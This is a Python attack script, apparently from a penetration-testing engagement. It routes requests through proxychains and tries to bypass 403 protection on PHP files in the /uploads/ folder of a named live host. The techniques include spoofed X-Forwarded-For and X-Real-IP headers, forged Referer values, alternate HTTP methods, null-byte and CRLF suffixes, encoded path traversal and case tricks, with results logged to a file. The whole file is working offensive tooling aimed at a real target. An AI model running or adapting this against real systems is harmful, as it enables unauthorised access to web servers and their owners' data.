#!/usr/bin/env python3
"""TASK 4: PHP Files in /uploads/ bypass attempts"""
import subprocess, time

BASE = "https://ifes25-semproxy.selecao.net.br"
OUT = "/home/ubuntu/engagement/cotec-fadenor.selecao.net.br/enum/uploads_bypass.txt"
SLEEP = 1.2

def curl(url, method="GET", headers=None):
    cmd = ["proxychains4", "-q", "curl", "-sk", "--max-time", "10", "-i"]
    if method != "GET":
        cmd += ["-X", method]
    if headers:
        for k, v in headers.items():
            cmd += ["-H", f"{k}: {v}"]
    cmd += [url]
    return subprocess.run(cmd, capture_output=True, text=True, timeout=15).stdout

results = []

# Base PHP files that return 403
php_files = ["index2.php", "info.php", "admin.php", "phpinfo.php"]

print("=== TASK 4: Uploads Bypass ===")

for php in php_files:
    # Test variations
    tests = [
        (f"/uploads/{php}", "GET", {}, "baseline 403"),
        (f"/uploads/{php}", "GET", {"X-Forwarded-For": "127.0.0.1"}, "X-Forwarded-For"),
        (f"/uploads/{php}", "GET", {"X-Real-IP": "127.0.0.1"}, "X-Real-IP"),
        (f"/uploads/{php}", "GET", {"X-Forwarded-For": "127.0.0.1", "X-Real-IP": "127.0.0.1"}, "both spoof"),
        (f"/uploads/{php}", "GET", {"Referer": "https://ifes25-semproxy.selecao.net.br/admin/"}, "Referer"),
        (f"/uploads/{php}", "GET", {"Referer": "https://ifes25-semproxy.selecao.net.br/admin/login"}, "Referer2"),
        (f"/uploads/{php}", "OPTIONS", {}, "OPTIONS"),
        (f"/uploads/{php}", "PUT", {}, "PUT"),
        (f"/uploads/{php}", "POST", {}, "POST"),
        (f"/uploads/./{php}", "GET", {}, "path traversal ./"),
        (f"/uploads/{php}?", "GET", {}, "trailing ?"),
        (f"/uploads/{php}#", "GET", {}, "trailing #"),
        (f"/uploads/{php};", "GET", {}, "trailing ;"),
        (f"/uploads/{php}%00", "GET", {}, "null byte"),
        (f"/uploads/{php}%2500", "GET", {}, "double null byte"),
        (f"/uploads/{php[0].upper() + php[1:]}", "GET", {}, "case change"),
        (f"/uploads/{php.upper()}", "GET", {}, "UPPERCASE"),
        (f"/uploads/index2.php/", "GET", {}, "trailing slash"),
        (f"/uploads/index2.php%20", "GET", {}, "space suffix"),
        (f"/uploads/index2.php%0a", "GET", {}, "newline"),
        (f"/uploads/index2.php%0d%0a", "GET", {}, "CRLF"),
        (f"/uploads/index2.php..%00", "GET", {}, "dot dot null"),
        (f"/uploads/.%2e/index2.php", "GET", {}, "URL encoded ../"),
        (f"/uploads/%2e%2e%2findex2.php", "GET", {}, "double encode"),
        (f"/uploads/index2.php%23", "GET", {}, "URL encoded #"),
        (f"/uploads/index2.php?.php", "GET", {}, "parameter pollution"),
    ]
    
    for url_path, method, headers, desc in tests:
        url = BASE + url_path
        r = curl(url, method=method, headers=headers)
        time.sleep(SLEEP)
        status = "UNKNOWN"
        for line in r.split('\n'):
            if line.startswith("HTTP/"):
                status = line.strip()
        body_len = len(r)
        key = f"[{desc}] {method} {url_path}"
        results.append(f"{key} -> {status} | len={body_len}")
        print(f"  {key} -> {status}")

with open(OUT, 'w') as f:
    f.write("=== UPLOADS BYPASS ===\n")
    f.write(f"Target: {BASE}\n\n")
    for line in results:
        f.write(line + "\n")

print(f"\n[+] Results saved to {OUT}")